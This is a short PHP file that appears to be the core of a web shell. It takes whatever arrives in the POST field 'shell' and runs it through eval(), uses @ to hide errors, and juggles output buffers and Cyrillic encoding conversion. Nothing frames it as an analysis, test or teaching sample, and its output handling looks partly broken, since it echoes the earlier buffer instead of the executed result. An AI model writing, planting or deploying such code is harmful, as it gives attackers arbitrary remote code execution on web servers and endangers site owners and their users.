<?php
$tmp = @ob_get_contents();
$olddir = realpath(".");

if ($tmp) {
   @ob_clean();
   $eval = $_POST['shell'];
   eval($eval);
   $ret = @ob_get_contents();
   $ret = convert_cyr_string($ret,"d","w");
   @ob_clean();
   echo $tmp;    
}
exit;
?>